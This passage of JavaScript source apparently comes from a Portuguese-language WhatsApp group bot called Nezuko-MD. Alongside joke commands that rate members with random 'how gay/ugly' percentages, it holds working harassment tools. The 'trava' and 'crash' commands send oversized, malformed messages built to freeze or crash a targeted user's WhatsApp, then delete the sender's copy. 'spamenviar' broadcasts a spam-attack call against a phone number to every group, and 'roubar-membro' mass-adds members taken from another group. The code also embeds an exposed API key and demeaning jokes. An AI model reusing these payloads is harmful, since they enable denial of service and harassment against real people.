desconfiança...😑'} else if (boiola == 41 ) {var bo = 'você é né?😏'} else if (boiola == 42 ) {var bo = 'você é né?😏'} else if (boiola == 43 ) {var bo = 'você é né?😏'} else if (boiola == 44 ) {var bo = 'você é né?😏'} else if (boiola == 45 ) {var bo = 'você é né?😏'} else if (boiola == 46 ) {var bo = 'você é né?😏'} else if (boiola == 47 ) {var bo = 'você é né?😏'} else if (boiola == 4 ) {var bo = 'você é né?😏'} else if (boiola == 49 ) {var bo = 'você é né?😏'} else if (boiola == 50 ) {var bo = 'você é ou não?🧐'} else if (boiola > 51) {var bo = 'você é gay🙈'
}
await nezuko.sendMessage(from, {image: wew, caption: `  O quanto você é gay? \n\n 「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱ gay 🏳️‍🌈\n\n${bo}`, mentions: [blamention_id], thumbnail:null}, {quoted: dnselo})
}, 7000)
break

case 'feio':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}

nezuko.sendMessage(from, {text: `❰ Pesquisando a sua ficha de feio : @${blamention_id.split("@")[0]} aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${imgfeio}`)
random = `${Math.floor(Math.random() * 110)}`
feio = random
if (feio < 20 ) {var bo = 'É não é feio'} else if (feio == 21 ) {var bo = '+/- feio'} else if (feio == 23 ) {var bo = '+/- feio'} else if (feio == 24 ) {var bo = '+/- feio'} else if (feio == 25 ) {var bo = '+/- feio'} else if (feio == 26 ) {var bo = '+/- feio'} else if (feio == 27 ) {var bo = '+/- feio'} else if (feio == 2 ) {var bo = '+/- feio'} else if (feio == 29 ) {var bo = '+/- feio'} else if (feio == 30 ) {var bo = '+/- feio'} else if (feio == 31 ) {var bo = 'Ainda tá na média'} else if (feio == 32 ) {var bo = 'Da pra pegar umas(ns) novinha(o) ainda'} else if (feio == 33 ) {var bo = 'Da pra pegar umas(ns) novinha(o) ainda'} else if (feio == 34 ) {var bo = 'É fein, mas tem baum coração'} else if (feio == 35 ) {var bo = 'Tá na média, mas não deixa de ser feii'} else if (feio == 36 ) {var bo = 'Bonitin mas é feio com orgulho'} else if (feio == 37 ) {var bo = 'Feio e preguiçoso(a), vai se arrumar praga feia'} else if (feio == 3 ) {var bo = 'tenho '} else if (feio == 39 ) {var bo = 'Feio, mas um banho E se arrumar, deve resolver'} else if (feio == 40 ) {var bo = 'FeiN,  mas não existe gente feia, existe gente que não conhece os produtos jequity'} else if (feio == 41 ) {var bo = 'você é Feio, mas é legal, continue assim'} else if (feio == 42 ) {var bo = 'Nada que uma maquiagem e se arrumar, que não resolva 🥴'} else if (feio == 43 ) {var bo = 'Feio que dói de ver, compra uma máscara que melhora'} else if (feio == 44 ) {var bo = 'Feio mas nada que um saco na cabeça não resolva né!?'} else if (feio == 45 ) {var bo = 'você é feio, mas tem bom gosto'} else if (feio == 46 ) {var bo = 'Feio mas tem muitos amigos'} else if (feio == 47 ) {var bo = 'Feio mas tem lábia pra pegar várias novinha'} else if (feio == 4 ) {var bo = 'Feio e ainda não sabe se vestir, vixi'} else if (feio == 49 ) {var bo = 'Feiooo'} else if (feio == 50 ) {var bo = 'você é Feio, mas não se encherga 🧐'} else if (feio > 51) {var bo = 'você é Feio demais 🙈'} 

await nezuko.sendMessage(from, {image: wew, caption: `  O quanto você é feio? \n\n 「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱ feio 🙉\n\n${bo}`, mentions: [blamention_id], thumbnail:null}, {quoted: dnselo})
}, 7000)
break 

case 'matar':
case 'mata':  
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply('marque o alvo que você quer matar')
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `Você Acabou de matar o(a) @${mentioned[0].split('@')[0]} 😈👹` 
jrpp = await getBuffer(`${matarcmd}`)
await nezuko.sendMessage(from, {video: jrpp, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: dnselo})
break 

case 'corno':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
nezuko.sendMessage(from, {text:` ❰ Pesquisando a ficha de corno : @${blamention_id.split("@")[0]}, aguarde... ❱`, mentions: [blamention_id]})
setTimeout(async() => {
wew = await getBuffer(`${imgcorno}`)
random = `${Math.floor(Math.random() * 110)}`
await nezuko.sendMessage(from, {image: wew, caption: ` O quanto você é corno? \n\n 「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱  corno 🐃`, mentions: [blamention_id]}, {quoted: dnselo})
}, 7000)
break


case 'vesgo':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
nezuko.sendMessage(from, {text:`❰ Pesquisando a ficha de vesgo : @${blamention_id.split("@")[0]}, aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${imgvesgo}`)
random = `${Math.floor(Math.random() * 110)}`
await nezuko.sendMessage(from, {image: wew, caption: `O quanto você é vesgo? \n\n「 @${blamention_id.split("@")[0]} 」Você é: ❰ '+random+'% ❱  Vesgo 🙄😆`, mentions: [blamention_id]}, {quoted: dnselo})
}, 7000)
break 

case 'bebado':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
nezuko.sendMessage(from, {text:`❰ Pesquisando a ficha de bebado : @${blamention_id.split("@")[0]} , aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${imgbebado}`)
random = `${Math.floor(Math.random() * 110)}`
await nezuko.sendMessage(from, {image: wew, caption:`O quanto você é bebado? \n\n「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱ Bêbado 🤢🥵🥴`, mentions: [blamention_id]}, {quoted: dnselo})
}, 7000)
break 

case 'gado':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
nezuko.sendMessage(from, {text:`❰ Pesquisando a ficha de gado : @${blamention_id.split("@")[0]}, aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${imggado}`)
random = `${Math.floor(Math.random() * 110)}`
await nezuko.sendMessage(from, {image: wew, caption: `O quanto você é gado? \n\n「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱  gado 🐂`, mentions: [blamention_id]}, {quoted: dnselo})
}, 7000)
break 

case 'gostoso':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
nezuko.sendMessage(from, {text:` ❰ Pesquisando a sua ficha de gostoso : @${blamention_id.split("@")[0]} aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${imggostoso}`)
random = `${Math.floor(Math.random() * 110)}`
await nezuko.sendMessage(from, {image: wew, caption: `O quanto você é gostoso? 😏\n\n「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱ gostoso 😝`, gifPlayback: true, mentions: [blamention_id]}, {quoted: dnselo})
}, 7000)
break 

case 'gostosa':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
nezuko.sendMessage(from, {text:`❰ Pesquisando a sua ficha de gostosa : @${blamention_id.split("@")[0]} aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${imggostosa}`)
random = `${Math.floor(Math.random() * 110)}`
await nezuko.sendMessage(from, {image: wew, caption: `O quanto você é gostosa? 😏\n\n「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱ gostosa 😳`, mentions: [blamention_id]}, {quoted: dnselo})
}, 7000)
break

case 'beijo':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply('Marque alguém que vc quer da um beijo')
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `Você deu um beijo gostoso na(o) @${mentioned[0].split('@')[0]} 😁👉👈❤` 
wew = await getBuffer(`${beijocmd}`)
await nezuko.sendMessage(from, {video: wew, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: dnselo})
break

case 'suporte': {
sections = [
    {
	title: "🇸 🇺 🇵 🇴 🇷 🇹 🇪 🇩 🇦  🇳 🇪 🇿 🇺 🇰 🇴   ",
	rows: [
	    {title: "[👥] Comandos de instalação do bot.", rowId: `${prefix}suporte-termux`, description: "Instalação da Nezuko-MD no Termux."},
	    {title: "[📝] Hospedagem do bot no Heroku.", rowId: `${prefix}suporte-hospedar`, description: "Comandos para hospedar no Heroku."},
	        {title: "[⚙️] Grupo para suporte da Nezuko.", rowId: `${prefix}suporte-grupo`, description: "Meu grupo para dúvidas e suporte."},
	        {title: "[💬] Aplicativos necessários do bot.", rowId: `${prefix}suporte-apps`, description: "Link dos aplicativos necessários do bot."},
	        {title: "[🚀] Como fazer as alterações no bot?", rowId: `${prefix}suporte-alterar`, description: "Ajuda na alteração de logos, dono e prefixo."},
	            {title: "<❗> Contato do meu desenvolvedor.", rowId: `${prefix}suporte-dono`, description: "Contato do criador ou link do whatsapp."},
	            {title: "[☔] Site da Nezuko-BOT.", rowId: `${prefix}nezukosite`, description: "Site para suportes e etc."},
	            {title: "[🎴] Download da Nezuko bot V1", rowId: `${prefix}nezukolink`, description: "Download Nezuko V1"}]
},
]
 
const listMessage2 = {
text: `𝐚𝐪𝐮𝐢 𝐞𝐬𝐭𝐚́ 𝐮𝐦 𝐦𝐞𝐧𝐮 𝐝𝐞 𝐬𝐮𝐩𝐨𝐫𝐭𝐞 𝐝𝐚\n𝐍𝐞𝐳𝐮𝐤𝐨 𝐩𝐚𝐫𝐚 𝐚𝐣𝐮𝐝𝐚𝐫 𝐯𝐨𝐜𝐞̂ 𝐚 𝐚𝐥𝐭𝐞𝐫𝐚𝐫 𝐨 \n𝐝𝐨𝐧𝐨, 𝐩𝐫𝐞𝐟𝐢𝐱𝐨 𝐞 𝐞𝐧𝐭𝐫𝐞 𝐨𝐮𝐭𝐫𝐨𝐬......`,
  footer: ``,
  buttonText: "🔍 𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑 🔍",
  sections
}
nezuko.sendMessage(from, listMessage2, {quoted: dnselo})
}
break

case 'sitenezuko':
case 'nezukosite':
reply(`http://Linktr.ee/NEZUKO_OFC`)
break

case 'suporte-termux':
reply ("[👥] *INSTALAÇÃO DO BOT NO TERMUX:*\n\n*Primeiro comando:*\npkg upgrade -y && pkg update -y && pkg install git -y && pkg install nodejs -y && pkg install nodejs-lts -y\n\n*Segundo comando:*\ntermux-setup-storage\n\n*Terceiro comando:*\ncd /sdcard/Nezuko-MD-V2 *ou* cd /sdcard/download/Nezuko-MD-V2\n\n*Quarto comando:*\npkg install ffmpeg -y && pkg install tesseract -y && pkg install python -y\n\n*Quinto comando:*\npkg install ffmpeg -y && pkg install wget -y \n\n*Chave para iniciar a Nezuko:*\nsh nezuko.sh")
break

case 'suporte-hospedar':
reply ("[📝] *HOSPEDAR BOT NO HEROKU:*\n\nPara hospedar de forma rápida e prática no heroku use o comando no termux: *sh hospedar.sh*\n\n*Tutorial de como hospedar seu bot no heroku:* https://youtu.be/a4PFeplGXsY")
break

case 'suporte-grupo':
reply ("[⚙️] https://chat.whatsapp.com/DTsrSH5CVF66Xvn9Ow61Yn")
break

case 'suporte-alterar':
reply (`[🚀] *ALTERAÇÕES NO BOT:*\n\n*Alterar prefixo:* Entre no arquivo *configurar.js* e procure por *global.prefix*, como padrão vai ter *"."*\nVocê só apaga isso o . e coloca o prefixo que você desejar.\n\n*Alterar número do dono:* Entre no arquivo *configurar.js* e procure por *global.numerodonoa* e coloque seu número entre às aspas.\n\n*Alterar logo:* Entre no arquivo *configurar.js*, procure por essas três definições: *global.err4r, global.log0, global.thumb*, Inicie o bot e mande a imagem que você deseja e mencione a foto enviada com o comando: ${prefix}imgpralink, depois copie o link enviado e cole nas *" "* dessas 3 definições.`)
break

case 'suporte-apps':
reply ("[💬] *APLICATIVOS NECESSÁRIOS:* \n\n*Download do Termux V0.119:* https://www.mediafire.com/file/0npdmv51pnttps0/com.termux_0.119.1-119_minAPI21(arm64-v8a,armeabi-v7a,x86,x86_64)(nodpi)_apkmirror.com.apk/file\n\n*Download do MT-Manager V2.10:* https://www.mediafire.com/file/0fttexpjoe3j54h/MT_Manager_Version_%255B_2.10.3_%255D_.apk/file\n\n*Download do ColorNote V4.4.0:* https://play.google.com/store/apps/details?id=com.socialnmobile.dictapps.notepad.color.note")
break

case 'tapa':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply('marque o alvo que você quer dá o tapa')
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `Você Acabou de da um tapa na raba da😏 @${mentioned[0].split('@')[0]} 🔥` 
jrq = await getBuffer(`${tapacmd}`)
await nezuko.sendMessage(from, {video: jrq, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: dnselo})
break

case 'chute':
case 'chutar':  
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')

if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply('marque o alvo que você quer dá um chute')
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `Você Acabou de da um chute em @${mentioned[0].split('@')[0]} 🤡` 
jry = await getBuffer(`${chutecmd}`)
await nezuko.sendMessage(from, {video: jry, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: dnselo})
break 

case 'dogolpe':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')

if (args.length < 1) return await nezuko.sendMessage(from, {text: 'coloca um nome'}, {quoted: dnselo})
pkt = body.slice(9)
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
random = `${Math.floor(Math.random() * 100)}`
jpr = `*GOLPISTA ENCONTRADO👉🏻*\n\n*GOLPISTA* : *${args[0]}*\n*PORCENTAGEM DO GOLPE* : ${random}%😂\n\nEle(a) gosta de ferir sentimentos 😢`
nezuko.sendMessage(from, {text: jpr, mentions: mentioned})
break

case 'nazista':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')

rate = body.slice(9)
nezuko.sendMessage(from, {text: ' ❰ Pesquisando a sua ficha de nazista : '+rate+' aguarde... ❱'})
 setTimeout(async() => {
wew = await getBuffer(`${imgnazista}`)
random = `${Math.floor(Math.random() * 110)}`
await nezuko.sendMessage(from, {image: wew, caption: 'O quanto você é nazista? \n\n「 '+rate+' 」Você é: ❰ '+random+'% ❱  nazista 卐'}, {quoted: dnselo})
}, 7000)
break 

case'roubar-membro':

if (!SoDono) return reply(`<❗> Somente meu dono pode usar esse comando.`)

if (!isGroup) return reply(mess.only.group)

if (!isBotAdmins) return reply(mess.only.botadm)

if (!q) return reply("falta algo") 

let oxiii = m.isGroup ? await nezuko.groupMetadata(`${q}`): ''

let pessoasss = m.isGroup ? oxiii.participants: ''

setTimeout( () => {

for (let fds of pessoasss) {

members_id = []

if (fds.jid === nezuko.user.id) return

members_id.push(fds.id)

nezuko.groupParticipantsUpdate(from, [fds.id], "add")

}

}, 10);

break

case 'idget':
                    if (!text) return reply ('Mande um link de um gp!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply ('Link Invalido!')
                   
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    await nezuko.groupAcceptInvite(result).then(res2 => {
                        var geitdd = res2.replace(`""`, ``);
                        m.reply(geitdd)
                    })
                        break

case 'id':
case 'idgp':
reply(m.chat)
break

case 'soundcloud3': 
// @Nezuko bot >3
qd = args.join(" ")
nezuko.sendMessage(from, { react: { text: `🔍`, key: m.key }})
if(qd.length < 7) return reply('Você deve pegar o link gerado do Soundcloud e usar com esse comando, e ele enviará seu áudio.')
anu = await fetchJson(`https://ayu.p7api.xyz/api/dl/sound?link=${q}&apikey=${keyapi2}`)
pla = `🎶 *Música:* ${anu.resultado.titulo}\n`
pla += `🏷️ *Total de downloads:* ${anu.resultado.total_downloads}\n`
pla += `*_Aguarde, estou enviando o áudio!_*`
img = await getBuffer(anu.resultado.capa)
nezuko.sendMessage(from, {image: img, caption: `${pla}`}, {quoted: dnselo})
nezuko.sendMessage(from, { audio: { url: anu.resultado.link_dl }, mimetype: 'audio/mpeg', fileName: `${anu.resultado.titulo}.mp3` }, { quoted: dnselo})
break

case 'pix1':
reply(`0f21bc37-8210-45c7-acec-24441b67c0ec`)
break

case 'pix22':
reply(`5521964523665`)
break

case 'doar': case 'donate': case 'doação': {
                let buttonse = [
                    {buttonId: `/pix1`, buttonText: {displayText: 'Chave aleatória'}, type: 1},
                    {buttonId: `/pix22`, buttonText: {displayText: 'Pix número'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `Olá, faça uma doação e contribua com que a Nezuko permanessa ativa

Qualquer valor e bem vindo, não existe

quantia baixa!

Chave De Sua Escolha`,
                    footer: '©  _Copyright by Nezuko-MD_',
                    buttons: buttonse,
                    headerType: 2
                }
                nezuko.sendMessage(m.chat, buttonMessagee, {quoted: dnselo})
            }
            break

case 'infspam':
reply(` Mande o Numero sem " + - " sem as aspas\nExemplo ${prefix}spamenviar 559999999`)
break

case 'spamenviar': {
if (!SoDono && !isCmdy && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (!q) return reply( `Texto onde?\n\nExemplo : ${prefix + command} BOA VISTA `)
let getGroups = await nezuko.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
for (let i of anu) {
await sleep(1500)
let txt = `🔥ATK DE SPAM AGORA 🔥\nMande msg e depois bloqueia 6× \nwa.me/${q}`
nezuko.sendMessage(i, {text: txt})
}
reply(`Enviando com sucesso🔥`)
}
break

case 'rankgay':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')

try{
d = []
ret = '🏳️‍🌈 Rank dos mais gays\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
ret += `🏳️‍🌈❧ @${groupMembers[r].id.split('@')[0]}\n`
d.push(groupMembers[r].id)
}
mentions(ret, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break

case 'rankgado':
case 'rankgados':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')

try{
d = []
ret = '🐂🐂 Rank dos mais gados do grupo \n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
ret += `🐂❧ @${groupMembers[r].id.split('@')[0]}\n`
d.push(groupMembers[r].id)
}
mentions(ret, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break

case 'clima':
case 'tempo':
if (args.length < 1) return reply(`*Sintaxe correta para uso:* ${prefix + command} cidade\n• Caso tenha algum acento, retire ok?`)
cidade = body.slice(7)
clima = await axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${cidade}&appid=548b8266f19038cfd1f6d6f007d8bc58&units=metric&lang=pt_br`)
if (clima.error) return reply(clima.error)
hora1 = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
jr = `
╭━━━『 𝙏𝙀𝙈𝙋𝙊/𝘾𝙇𝙄𝙈𝘼 』━━━╮
│⌁ 令 🌡️ Agora: ${clima.data.main.temp}ºC
│⌁ 令 🏙️ Cidade: ${clima.data.name}
│⌁ 令 🔺 Temp. Máxima: ${clima.data.main.temp_max}°C
│⌁ 令 🔻 Temp. Mínima: ${clima.data.main.temp_min}°C
│⌁ 令 🌦️ Clima: ${clima.data.weather[0].description}
│⌁ 令 💧 Umidade do Ar: ${clima.data.main.humidity}%
│⌁ 令 🌬️ Ventos: ${clima.data.wind.speed}  
╰━━━━━━━━━━〔 ${hora1} 〕
`
await nezuko.sendMessage(from, {text: jr}, {quoted:info, contextInfo: {"mentionedJid": jr}})	
break

case 'clima2':
case 'tempo2':
if (args.length < 1) return reply(`*Sintaxe correta para uso:* ${prefix + command} cidade\n• Caso tenha algum acento, retire ok?`)
cidade = body.slice(7)
clima = await axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${cidade}&appid=548b8266f19038cfd1f6d6f007d8bc58&units=metric&lang=pt_br`)
if (clima.error) return reply(clima.error)
hora1 = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
jr = `— Confira agora o clima em ${q} 🌡☀️

🌡️ Temperatura agora: ${clima.data.main.temp}ºC
🏙️ Cidade: ${clima.data.name}

🔺 Temperatura Máxima: ${clima.data.main.temp_max}°C
🔻 Temperatura Mínima: ${clima.data.main.temp_min}°C

🌦 Clima: ${clima.data.weather[0].description}
💧 Umidade de ar: ${clima.data.main.humidity}%
🌬️ Ventos: ${clima.data.wind.speed}  

Solicitado por: ${pushname} às〔 ${hora1} 〕`
await nezuko.sendMessage(from, {text: jr}, {quoted:dnselo, contextInfo: {"mentionedJid": jr}})	
break

case 'live':
// by Nezuko-MD 
addFilter(from);
if (args.length < 1) return reply("❌ Pesquise títulos de live do youtube.");
await reply("✔️ Espere... Pesquisando live no youtube.");
await yts(text).then((anu) => {
teks = `No momento existe ${anu.live.length} lives online.\n\n`
for (let m of anu.live) {
teks += `➡️ Tipo: *${m.type}*
✅ Nome: *${m.title}*
✅ Link: *${m.url}*
✅ Autor: *${m.author.name}*
✅ Canal: *${m.author.url}*
✅ Descrição: *${m.description}*\n`;
}
nezuko.sendMessage(from, {image: {url: anu.live[0].image}, caption: teks}, {quoted: dnselo});
}).catch((err) => {
console.log("Err: %s", color(err, "red"));
reply(err == "TypeError: Cannot read properties of undefined (reading 'image')" ? "No momento não existe live ao vivo.": err)
});
break;

//========TRAVAS=============\\
case 'loc': case 'travaloc'://By Carlos 
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
nezuko.sendMessage(from, {location: {degreesLatitude: 173.282,degreesLongitude: -19.378,name: `${funeral}`,addrees: '©  _Copyright by Daniel_'}},{quoted:m})
break

case 'loc4': case 'travaloc4'://By Carlos 
addFilter(from);
if (!SoDono) return reply(`<❗> Somente meu dono pode usar esse comando.`)
nezuko.sendMessage(from, {location: {degreesLatitude: 173.282,degreesLongitude: -19.378,name: `${buttonkal}\n${travavideo}`,addrees: '©  _Copyright by Nezuko-MD'}},{quoted:m})
break

case'loc5': case 'travaloc5'://By Carlos 
addFilter(from);
if (!SoDono) return reply(`<❗> Somente meu dono pode usar esse comando.`)
nezuko.sendMessage(from, {location: {degreesLatitude: 173.282,degreesLongitude: -19.378,name: `${buttonkal}\n${travavideo}\n${doc}\n${listbug}\n${ngazap}`,addrees: '©  _Copyright by Nezuko-MD_'}},{quoted:m})
break

case 'loc8': case 'travaloc8'://By Carlos 
addFilter(from);
if (!SoDono) return reply(`<❗> Somente meu dono pode usar esse comando.`)
nezuko.sendMessage(from, {location: {degreesLatitude: 173.282,degreesLongitude: -19.378,name: `${travaloc}\n${travaloc}\n${travaloc}\n${travaloc}\n${travaloc}\n${travaloc}\n${travaloc}`,addrees: '©  _Copyright by Nezuko-MD_'}},{quoted:m})
break

case 'matahome': case 'matabutton'://By Carlos 
addFilter(from);
if (!SoDono) return reply(`<❗> Somente meu dono pode usar esse comando.`)
nezuko.sendMessage(from, {location: {degreesLatitude: 173.282,degreesLongitude: -19.378,name: `${home}\n${home}\n${home}\n${home}\n${home}\n${home}\n${home}`,addrees: '©  _Copyright by Nezuko-MD_'}},{quoted:m})
break

case 'travavideo': {
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
                await nezuko.sendMessage(m.chat, {video: fs.readFileSync(`./src/travas/mor.mp4`), caption: `${porra}`}, {quoted: m})
            }
            break

case 'travafoto3': {
addFilter(from);
if (!SoDono) return reply(`<❗> Somente meu dono pode usar esse comando.`)
nezuko.sendMessage(m.chat, {image: fs.readFileSync('./src/travas/travafoto3.jpg'), caption: `${buttonkal}\n${travavideo}\n${doc}\n${listbug}\n${ngazap}`}, {quoted: m})
}
break

case 'crash':
if(!SoDono) return reply(enviar.msg.donosmt)
try{
var mentioned = msg.message.extendedTextMessage.contextInfo.participant
}catch{
mentioned = args.join(' ').replace(new RegExp("[()+ -/ +/]", "gi"), "").split('/')[0]
}
if(!mentioned || (mentioned == ''))return reply('Erro em identificar menção')
reply("pronto! crashando...")
for(i = 0;i< q.includes('/') ? Number(q.split('/')[1]): 5;i++){
await delay(2000)
if(i == Number(q.includes('/') ? q.split('/')[1] : 5))reply('prontim chefe')
var userio = mentioned.replace('@s.whatsapp.net', '').replace('@')
let selocrrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "0@g.us"}, "message": { orderMessage: { itemCount: -666, status: 200, jpegThumbnail: null, surface: 200, message: `${buttonkal}\n${travavideo}`, orderTitle: '❔🤣', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
nezuko.sendMessage(`${userio}@s.whatsapp.net`, {text: '😈𝘾𝙧𝙖𝙨𝙝𝙖𝙣𝙙𝙤 𝙏𝙪𝙙𝙤😈'}, {quoted: selocrrash}) 
}
break

case 'crash2':
try {
addFilter(from);
if(!SoDono) return reply(enviar.msg.donosmt)
if(q && args[0] === "-fake") {
teks = ""
for (var i = 0; i < 100; i++) {
teks += "💤"
}
tekks = ""
for (var i = 0; i < 200; i++) {
tekks += "؅؀؁؂؃؄"
}
tekkss = ""
for (var i = 0; i < 800; i++) {
tekkss += "‍"
}
let button = [
{buttonId: `crashed</>`, buttonText: {displayText: teks}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: teks}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: teks}, type: 1}
]
fuck = {
text: `❤‍🔥 𝐂𝐚𝐩𝐞𝐭𝐢𝐧𝐡𝐚 😈${tekkss}${tekks}`,
button: button,
footer: "e outros 101631 caracteres",
contextInfo: {
"forwardingScore": 999,
"isForwarded": true}}
let selocrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "120363022697760691@g.us"}, "message": { orderMessage: { itemCount: -666, status: 200, jpegThumbnail: null, surface: 200, message: teks, orderTitle: '❔🤣', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
let abc = await nezuko.sendMessage(m.chat, fuck, {quoted:selocrash})
await nezuko.chatModify({ clear: { messages: [{ id: abc.key.id, fromMe: true, timestamp: abc.messageTimestamp.low }] } }, abc.key.remoteJid, [])
return
}
try {
vacilao = mek.message.extendedTextMessage.contextInfo.mentionedJid[0] ? mek.message.extendedTextMessage.contextInfo.mentionedJid[0] : mek.message.extendedTextMessage.contextInfo.participant
} catch {
if(q.includes("/")) {
vacilao = q.split("/")[0] || ""
} else {
vacilao = `${args.join(" ").replace(/\D/g,'')}`
}
}
try {
envi = q.split("/")[1].replace(/\D/g,'') || 1
} catch {
envi = 1
}
let id = `${vacilao.replace(/\D/g,'')}`
if(!id) return reply(`Cadê o número?`)
let [result] = await nezuko.onWhatsApp(id)
if(!result) return reply(`Numero inexistente`)
teks = ""
for (var i = 0; i < 60000; i++) {
teks += "💤"
}
let button = [
{buttonId: `crashed</>`, buttonText: {displayText: teks}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: teks}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: teks}, type: 1}
]
fuck = {
text: `❤‍🔥 𝐂𝐚𝐩𝐞𝐭𝐢𝐧𝐡𝐚 😈`,
button: button,
footer: "e outros 101631 caracteres",
contextInfo: {
"forwardingScore": 999,
"isForwarded": true}}
let selocrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "0@g.us"}, "message": { orderMessage: { itemCount: -666, status: 200, jpegThumbnail: null, surface: 200, message: teks, orderTitle: '❔🤣', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
for (var i = 0; i < Number(envi); i++) {
let abc = await nezuko.sendMessage(result.jid, fuck, {quoted:selocrash})
await nezuko.chatModify({ clear: { messages: [{ id: abc.key.id, fromMe: true, timestamp: abc.messageTimestamp.low }] } }, abc.key.remoteJid, [])
await sleep(500)
}
